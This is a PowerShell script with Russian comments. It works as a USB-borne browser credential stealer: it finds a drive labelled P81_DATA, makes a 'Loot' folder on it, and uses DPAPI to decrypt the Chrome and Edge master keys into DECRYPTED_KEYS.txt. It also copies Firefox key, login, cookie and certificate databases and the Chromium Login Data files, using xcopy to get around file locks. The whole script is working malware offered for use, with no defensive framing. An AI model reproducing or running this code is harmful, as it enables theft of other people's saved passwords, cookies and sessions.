# 1. Поиск флешки P81_DATA
$disk = (Get-WmiObject Win32_Volume | Where-Object {$_.Label -eq 'P81_DATA'}).DriveLetter
if (!$disk) { exit }

# 2. Папка назначения
$dest = "$($disk)\Loot_$(Get-Date -f HHmm)"
cmd /c "mkdir $dest 2>nul"
$report = "$dest\DECRYPTED_KEYS.txt"

# 3. Chromium (Chrome, Edge, Yandex) - Дешифровка ключей на месте
Add-Type -AssemblyName System.Security
$browsers = @(
    @{n="CHROME"; p="$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"},
    @{n="EDGE"; p="$env:LOCALAPPDATA\Microsoft\Edge\User Data\Local State"}
)

foreach ($b in $browsers) {
    if (Test-Path $b.p) {
        try {
            $json = Get-Content $b.p -Raw | ConvertFrom-Json
            $enc = [Convert]::FromBase64String($json.os_crypt.encrypted_key)
            $dec = [System.Security.Cryptography.ProtectedData]::Unprotect($enc[5..($enc.Length-1)], $null, 0)
            "[$($b.n)] MasterKey: $([Convert]::ToBase64String($dec))" | Out-File $report -Append
        } catch {}
    }
}

# 4. FIREFOX - Сбор файлов для дешифровки дома
$ffPath = "$env:APPDATA\Mozilla\Firefox\Profiles"
if (Test-Path $ffPath) {
    $ffDest = New-Item -Path $dest -Name "Firefox" -ItemType "Directory" -Force
    Get-ChildItem -Path $ffPath -Directory | ForEach-Object {
        $p = $_.FullName
        $n = $_.Name
        # Копируем ключи, пароли и куки
        $files = @("key4.db", "logins.json", "cookies.sqlite", "cert9.db")
        foreach ($f in $files) {
            $srcFile = Join-Path $p $f
            if (Test-Path $srcFile) {
                # Сохраняем с префиксом профиля, чтобы не перемешались
                cmd /c "copy /y `"$srcFile`" `"$ffDest\$($n)_$f`""
            }
        }
    }
}

# 5. Копирование баз Chromium (xcopy для обхода блокировок)
cmd /c "xcopy /y /s /q `"$env:LOCALAPPDATA\Google\Chrome\User Data\*\Login Data`" `"$dest\Chrome\`" 2>nul"
cmd /c "xcopy /y /s /q `"$env:LOCALAPPDATA\Microsoft\Edge\User Data\*\Login Data`" `"$dest\Edge\`" 2>nul"

exit
